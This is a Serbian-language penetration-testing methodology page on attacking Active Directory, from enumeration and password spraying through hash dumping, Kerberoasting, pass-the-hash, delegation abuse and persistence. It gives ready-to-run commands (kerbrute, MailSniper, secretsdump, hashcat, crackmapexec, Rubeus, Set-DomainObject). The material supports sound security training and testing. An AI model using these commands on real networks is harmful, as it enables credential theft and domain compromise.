# Active Directory Metodologija

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja omogućava **network administrators** efikasno kreiranje i upravljanje **domains**, **users** i **objects** unutar mreže. Dizajniran je za skaliranje, olakšavajući organizovanje velikog broja korisnika u upravljive **groups** i **subgroups**, dok se kontrolišu **access rights** na različitim nivoima.

Struktura **Active Directory** sastoji se iz tri primarna sloja: **domains**, **trees** i **forests**. **Domain** obuhvata kolekciju objekata, kao što su **users** ili **devices**, koji dele zajedničku bazu podataka. **Trees** su grupe ovih domena povezane zajedničkom strukturom, a **forest** predstavlja skup više trees, međusobno povezanih kroz **trust relationships**, formirajući najviši nivo organizacione strukture. Specifična **access** i **communication rights** mogu biti dodeljena na svakom od ovih nivoa.

Ključni koncepti unutar **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije koje se odnose na Active Directory objekat.
2. **Object** – Označava entitete u direktorijumu, uključujući **users**, **groups** ili **shared folders**.
3. **Domain** – Služi kao kontejner za directory objekte, pri čemu više domena može koegzistirati unutar **forest**, svaki održavajući sopstvenu kolekciju objekata.
4. **Tree** – Grupisanje domena koja dele zajednički root domain.
5. **Forest** – Najviši nivo organizacione strukture u Active Directory, sastavljen od više trees sa **trust relationships** među njima.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa ključnih za centralizovano upravljanje i komunikaciju u mreži. Ovi servisi obuhvataju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **users** i **domains**, uključujući **authentication** i **search** funkcionalnosti.
2. **Certificate Services** – Nadgleda kreiranje, distribuciju i upravljanje sigurnim **digital certificates**.
3. **Lightweight Directory Services** – Podržava directory-enabled aplikacije putem **LDAP protocol**.
4. **Directory Federation Services** – Pruža **single-sign-on** mogućnosti za autentifikaciju korisnika preko više web aplikacija u jednoj sesiji.
5. **Rights Management** – Pomaže u zaštiti autorskog materijala regulisanjem njegove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Ključan za rešavanje **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Kratki vodič

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Ako imate pristup AD okruženju ali nemate nikakve credentials/sessions, možete:

- **Pentest the network:**
- Skenirajte mrežu, pronađite mašine i otvorene portove i pokušajte **exploit vulnerabilities** ili **extract credentials** iz njih (na primer, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumerating DNS može dati informacije o ključnim serverima u domenu kao što su web, printers, shares, vpn, media, itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija o tome kako ovo izvesti.
- **Check for null and Guest access on smb services** (ovo neće raditi na modernim verzijama Windows-a):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič kako da enumerišete SMB server možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič kako da enumerišete LDAP možete pronaći ovde (posvetite **posebnu pažnju anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Prikupite credentials impersonating services with Responder: [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupite hostu abusing the relay attack: [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Prikupite credentials exposing fake UPnP services with evil-S: [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izvucite usernames/ime iz internih dokumenata, social media, servisa (uglavnom web) unutar domain okruženja, kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih u kompaniji, možete pokušati različite AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Pogledajte stranice [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zahteva invalid username, server će odgovoriti koristeći **Kerberos error** kod _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je username nevažeći. **Valid usernames** će izazvati ili **TGT in a AS-REP** response ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, što ukazuje da se od korisnika zahteva pre-authentication.
- **No Authentication against MS-NRPC**: Korišćenjem auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na domain controller-ima. Metoda poziva funkciju `DsrGetDcNameEx2` nakon bindovanja MS-NRPC interfejsa kako bi proverila da li korisnik ili računar postoji bez ikakvih credentials. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovaj tip enumeracije. Istraživanje se može pronaći [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako pronađete jedan od ovih servera u mreži, možete takođe izvesti user enumeration protiv njega. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Možete pronaći liste korisničkih imena u [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) i u ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena osoba koje rade u kompaniji** iz recon faze koju ste prethodno trebali da izvršite. Sa imenom i prezimenom možete koristiti skript [**namemash.py**](https://gist.github.com/superkojiman/11076951) da generišete potencijalna važeća korisnička imena.

### Ako znate jedno ili više korisničkih imena

U redu, dakle već imate važeće korisničko ime, ali nemate lozinke... Probajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_ možete **zatražiti AS_REP poruku** za tog korisnika koja će sadržati neke podatke šifrovane izvedenicom lozinke korisnika.
- [**Password Spraying**](password-spraying.md): Probajte najčešće lozinke za svakog od otkrivenih korisnika — možda neko koristi lošu lozinku (imajte na umu politiku lozinki!).
- Napomena: takođe možete **spray OWA servers** da pokušate da dobijete pristup korisničkim mail serverima.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **nabavite** neke challenge **hashes** za razbijanje vršenjem **poisoning** nekih protokola na **mreži**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ako ste uspeli da enumerišete Active Directory imaćete **više emailova i bolje razumevanje mreže**. Možda ćete moći da primorate NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) da biste dobili pristup AD okruženju.

### NetExec workspace-driven recon & relay posture checks

- Koristite **`nxcdb` workspaces** za čuvanje stanja AD recon-a po angažmanu: `workspace create <name>` kreira per-protocol SQLite DB-ove pod `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Prebacujte prikaze sa `proto smb|mssql|winrm` i listajte prikupljene tajne sa `creds`. Ručno obrišite osetljive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.
- Brzo otkrivanje podmreže pomoću **`netexec smb <cidr>`** otkriva **domain**, **OS build**, **SMB signing requirements**, i **Null Auth**. Članovi koji prikazuju `(signing:False)` su **relay-prone**, dok DCs često zahtevaju signing.
- Generišite **hostnames in /etc/hosts** direktno iz NetExec izlaza kako biste olakšali targetiranje:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay to the DC is blocked** zbog signing-a, ipak proverite **LDAP** posture: `netexec ldap <dc>` ističe `(signing:None)` / weak channel binding. DC sa obaveznim SMB signing-om ali onemogućenim LDAP signing-om i dalje predstavlja održiv **relay-to-LDAP** target za zloupotrebe kao što je **SPN-less RBCD**.

### Klijentski printer credential leaks → masovna validacija domenskih kredencijala

- Printer/web UI ponekad **ugrađuju maskirane administratorske lozinke u HTML**. Pregled source/devtools može otkriti cleartext (npr., `<input value="<password>">`), što omogućava Basic-auth pristup repozitorijumima za skeniranje/štampu.
- Preuzeti print jobovi mogu sadržati **plaintext onboarding docs** sa lozinkama po korisniku. Prilikom testiranja držite parove usklađenim:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Krađa NTLM Creds

Ako možete da **pristupite drugim PC-jevima ili share-ovima** pomoću **null ili guest user**, možete **postaviti fajlove** (kao što je SCF file) koji, ako se na neki način pristupi njima, će **pokrenuti NTLM authentication prema vama** tako da možete **steal** **NTLM challenge** i crack-ovati ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidat-šifru za druge, sporije formate čiji se ključni materijal direktno izvodi iz NT hash-a. Umesto da brute-force-ujete duge passphrase-e u Kerberos RC4 tiketima, NetNTLM izazovima, ili cached credentials, ubacite NT hash-e u Hashcat-ove NT-candidate mode-ove i pustite ga da validira reuse password-a bez ikada saznanja plaintext-a. Ovo je posebno efikasno nakon kompromitovanja domena gde možete harvest-ovati na hiljade aktuelnih i istorijskih NT hash-eva.

Koristite shucking kada:

- Imate NT korpus iz DCSync, SAM/SECURITY dump-ova, ili credential vault-ova i treba da testirate reuse u drugim domenima/forest-ovima.
- Uhvatite RC4-based Kerberos materijal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore, ili DCC/DCC2 blob-ove.
- Želite brzo da dokažete reuse za duge, neprobijive passphrase-e i odmah pivot-ujete putem Pass-the-Hash.

Tehnika **ne radi** protiv encryption tipova čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen forsira samo AES, morate se vratiti na regularne password mode-ove.

#### Building an NT hash corpus

- **DCSync/NTDS** – Koristite `secretsdump.py` sa history da izvučete što veći skup NT hash-eva (i njihovih prethodnih vrednosti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History unosi znatno šire kandidat-pool zato što Microsoft može da čuva do 24 prethodna hasha po nalogu. Za više načina kako da harvest-ujete NTDS secrets, pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) ekstrahuje lokalne SAM/SECURITY podatke i cached domain logons (DCC/DCC2). Deduplicirajte i append-ujte te hashe u isti `nt_candidates.txt` fajl.
- **Track metadata** – Čuvajte username/domain koji je proizveo svaki hash (čak i ako wordlist sadrži samo hex). Matching hashevi odmah govore koji principal reuse-uje password čim Hashcat ispiše pobednički kandidat.
- Preferirajte kandidate iz istog forest-a ili trusted forest-a; to maksimizira šansu za overlap prilikom shuck-ovanja.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **moras da ostanu raw 32-hex NT hashes**. Isključite rule engine-e (bez `-r`, bez hybrid mode-ova) jer mangling kvari kandidat key materijal.
- Ovi mode-ovi nisu inherentno brži, ali NTLM keyspace (~30,000 MH/s na M3 Max) je ~100× brži od Kerberos RC4 (~300 MH/s). Testiranje kuriranog NT lista je mnogo jeftinije nego istraživanje celog password prostora u sporom formatu.
- Uvek koristite **najnoviju Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) jer su mode-ovi 31500/31600/35300/35400 stigli nedavno.
- Trenutno ne postoji NT mode za AS-REQ Pre-Auth, i AES etype-ovi (19600/19700) zahtevaju plaintext password jer se njihovi ključevi izvode preko PBKDF2 iz UTF-16LE password-a, a ne iz raw NT hash-a.

#### Example – Kerberoast RC4 (mode 35300)

1. Uhvati RC4 TGS za ciljani SPN sa low-privileged user-om (vidi Kerberoast stranicu za detalje):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck-uj tiket koristeći svoj NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 ključ iz svakog NT kandidata i validira `$krb5tgs$23$...` blob. Match potvrđuje da service account koristi jedan od vaših postojećih NT hash-eva.

3. Odmah pivot-ujte putem PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalno možete kasnije oporaviti plaintext sa `hashcat -m 1000 <matched_hash> wordlists/` ako je potrebno.

#### Example – Cached credentials (mode 31600)

1. Dump-ujte cached logons sa kompromitovane workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopirajte DCC2 liniju za interesantnog domain user-a u `dcc2_highpriv.txt` i shuck-ujte:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešan match daje NT hash koji je već poznat u vašoj listi, dokazujući da cached user reuse-uje password. Koristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM modu da oporavite string.

Isti workflow se primenjuje za NetNTLM challenge-response (`-m 27000/27100`) i DCC (`-m 31500`). Kada se match identifikuje, možete pokrenuti relay, SMB/WMI/WinRM PtH, ili ponovo crack-ovati NT hash sa maskama/rules offline.

## Enumerating Active Directory WITH credentials/session

Za ovu fazu morate da imate **kompromitovane credentials ili session** važećeg domain naloga. Ako imate neke validne credentials ili shell kao domain user, **treba da zapamtite da prethodno navedene opcije i dalje ostaju načini da kompromitujete druge korisnike**.

Pre nego što započnete authenticated enumeration treba da znate šta je **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitovanje naloga je **velik korak ka kompromitovanju celog domena**, jer ćete moći da započnete **Active Directory Enumeration:**

Što se tiče [**ASREPRoast**](asreproast.md) sada možete pronaći sve moguće vulnerable korisnike, a što se tiče [**Password Spraying**](password-spraying.md) možete dobiti **listu svih korisničkih imena** i pokušati password kompromitovanog naloga, prazne lozinke i nove potencijalne lozinke.

- Možete koristiti [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Takođe možete koristiti [**powershell for recon**](../basic-powershell-for-pentesters/index.html) što će biti stealthier
- Možete koristiti i [**powerview**](../basic-powershell-for-pentesters/powerview.md) za ekstrakciju detaljnijih informacija
- Još jedan odličan alat za recon u Active Directory je [**BloodHound**](bloodhound.md). Nije **veoma stealthy** (zavisno od metoda sakupljanja koje koristite), ali **ako vam stealth nije bitan**, definitivno ga isprobajte. Nađite gde korisnici mogu RDP-ovati, pronađite puteve do drugih grupa, itd.
- **Drugi automatizovani AD enumeration alati su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) jer mogu sadržati zanimljive informacije.
- Alat sa GUI koji možete koristiti za enumeraciju direktorijuma je **AdExplorer.exe** iz **SysInternal** Suite.
- Takođe možete pretraživati LDAP bazu sa **ldapsearch** da tražite credentials u poljima _userPassword_ & _unixUserPassword_, ili čak u _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Ako koristite **Linux**, možete takođe enumerisati domen koristeći [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete takođe isprobati automatizovane alate kao:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Vrlo je lako dobiti sva korisnička imena domena iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ova Enumeration sekcija izgleda kratko, ovo je najvažniji deo svega. Otvorite linkove (uglavnom one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok ne budete sigurni. Tokom assessment-a, ovo će biti ključni trenutak da pronađete put do DA ili da odlučite da ništa ne možete učiniti.

### Kerberoast

Kerberoasting podrazumeva dobijanje **TGS tiketa** koje koriste servisi vezani za korisničke naloge i crack-ovanje njihove enkripcije — koja se bazira na korisničkim lozinkama — **offline**.

Više o tome u:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Jednom kada dobijete neke credentials, možete proveriti da li imate pristup nekom **mašini**. Za to možete koristiti **CrackMapExec** da pokušate konekciju na više servera koristeći različite protokole, u skladu sa vašim port scan-ovima.

### Local Privilege Escalation

Ako imate kompromitovane credentials ili session kao običan domain user i imate **pristup** tom korisniku na **bilo kojoj mašini u domenu**, treba da pokušate da pronađete način da **povisite privilegije lokalno i loot-ujete credentials**. Samo sa lokalnim administrator privilegijama moći ćete da **dump-ujete hash-eve drugih korisnika** iz memorije (LSASS) i lokalno (SAM).

Postoji kompletna stranica u ovoj knjizi o [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) i [**checklist**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Veoma je **neverovatno** da ćete naći **tikete** u trenutnom korisniku koji vam daju permisiju za pristup neočekivanim resursima, ali možete proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ako uspete da enumerišete Active Directory imaćete **više e‑mail adresa i bolje razumevanje mreže**. Možda ćete moći da prisilite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Traži Creds u deljenim računarima | SMB Shares

Sada kada imate neke osnovne credentials trebalo bi da proverite da li možete **pronaći** bilo koje **zanimljive fajlove koji se dele unutar AD**. To možete raditi ručno, ali je veoma dosadan i repetitivan zadatak (pogotovo ako nađete stotine dokumenata koje treba proveriti).

[**Pratite ovaj link da biste saznali o alatima koje možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete **pristupiti drugim PC-evima ili share-ovima** mogli biste **postaviti fajlove** (kao SCF fajl) koji, ako se nekako pristupi njima, će **pokrenuti NTLM autentifikaciju prema vama** tako da možete **ukrasti** **NTLM challenge** kako biste ga razbili:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala bilo kojem autentifikovanom korisniku da **kompromituje domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation na Active Directory SA privilegovanim kredencijalima/sesijom

**Za sledeće tehnike običan domain user nije dovoljan, potrebne su vam neke specijalne privilegije/credentials da biste izveli ove napade.**

### Hash extraction

Nadamo se da ste uspeli da **kompromitujete neki local admin** account koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da iskopate sve hashes iz memorije i lokalno.\
[**Pročitajte ovu stranicu o različitim načinima dobijanja hash-ova.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga koristiti da ga **imitirate**.\
Treba da koristite neki **tool** koji će **izvršiti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete kreirati novi **sessionlogon** i **inject-ovati** taj **hash** u **LSASS**, pa kada se izvrši bilo koja **NTLM autentifikacija**, taj **hash će biti korišćen.** Poslednja opcija je ono što radi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **koristi korisnikov NTLM hash za zahtev Kerberos tiketa**, kao alternativa uobičajenom Pass The Hash preko NTLM protokola. Stoga, ovo može biti posebno **korisno u mrežama gde je NTLM protokol onemogućen** i gde je dozvoljen samo **Kerberos** kao protokol autentifikacije.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

U metodi napada **Pass The Ticket (PTT)**, napadači **kradu korisnikov autentifikacioni tiket** umesto njegove lozinke ili hash vrednosti. Taj ukradeni tiket se potom koristi da **imitira korisnika**, stičući neovlašćeni pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **password** lokalnog administratora trebalo bi da pokušate da se **lokalno prijavite** na druge **PC-e** koristeći iste podatke.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i da bi **LAPS** to **ublažio**.

### MSSQL zlopotreba i pouzdane veze

Ako korisnik ima privilegije za **access MSSQL instances**, mogao bi da ih iskoristi za **execute commands** na MSSQL hostu (ako proces radi kao SA), da **steal** NetNTLM **hash** ili čak da izvede **relay attack**.\
Takođe, ako je MSSQL instanca trustovana (database link) od strane druge MSSQL instance — ako korisnik ima privilegije nad trustovanom bazom, moći će da **use the trust relationship to execute queries also in the other instance**. Ove trust veze se mogu lančano povezivati i u nekom trenutku korisnik može pronaći pogrešno konfigurisan DB gde može da izvršava komande.\
**Veze između baza rade čak i preko forest trusts.**

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zlopotreba platformi za IT asset/deployment

Third-party inventory i deployment suite često otkrivaju moćne puteve do credentials i izvršenja koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer object sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate privilegije na tom računaru u domenu, bićete u stanju da dumpujete TGTs iz memorije svakog korisnika koji se loguje na taj računar.\
Dakle, ako se **Domain Admin logins onto the computer**, moći ćete da dumpujete njegov TGT i da ga impersonate pomoću [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation možete čak i **automatski kompromitovati Print Server** (nadamo se da će to biti DC).

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen "Constrained Delegation", on će moći da **impersonate any user to access some services in a computer**.\
Zatim, ako **compromise the hash** tog korisnika/računara, moći ćete da **impersonate any user** (čak i domain admins) da biste pristupili određenim servisima.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Imati **WRITE** privilegiju na Active Directory objektu udaljenog računara omogućava dobijanje izvršavanja koda sa **elevated privileges**:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Zlopotreba Permissions/ACLs

Kompromitovani korisnik mogao bi imati neke **interesantne privilegije nad nekim domain objektima** koje bi vam mogle omogućiti **lateral move** ili **escalate** privilegija.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Zlopotreba Printer Spooler servisa

Otkrivanje **Spool servisa koji osluškuje** unutar domena može se zloupotrebiti za **acquire new credentials** i **escalate privileges**.

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Zlopotreba sesija trećih strana

Ako **drugi korisnici** **access** kompromitovani računar, moguće je **gather credentials from memory** i čak **inject beacons in their processes** kako biste ih impersonate-ovali.\
Obično će se korisnici povezivati putem RDP-a, pa evo kako izvesti par napada nad RDP sesijama trećih strana:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **local Administrator password** na računarima pridruženim domenu, osiguravajući da su nasumični, jedinstveni i često **menjani**. Ovi passwords su skladišteni u Active Directory i pristup im je kontrolisan kroz ACLs samo autorizovanim korisnicima. Sa dovoljnim permisijama za pristup ovim password-ima, pivotovanje na druge računare postaje moguće.

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** sa kompromitovanog računara može biti način za eskalaciju privilegija unutar okruženja:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ako su konfigurirani **vulnerable templates**, moguće ih je zloupotrebiti za eskalaciju privilegija:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-eksploatacija sa nalogom visokih privilegija

### Dumping Domain Credentials

Kada dobijete **Domain Admin** ili još bolje **Enterprise Admin** privilegije, možete **dump** **domain database**: _ntds.dit_.

[**Više informacija o DCSync attack možete naći ovde**](dcsync.md).

[**Više informacija o tome kako ukrasti NTDS.dit možete naći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc kao Persistence

Neke od ranije opisanih tehnika mogu se koristiti za održavanje pristupa (persistence).\
Na primer, možete:

- Učiniti korisnike podložnim [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Učiniti korisnike podložnim [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

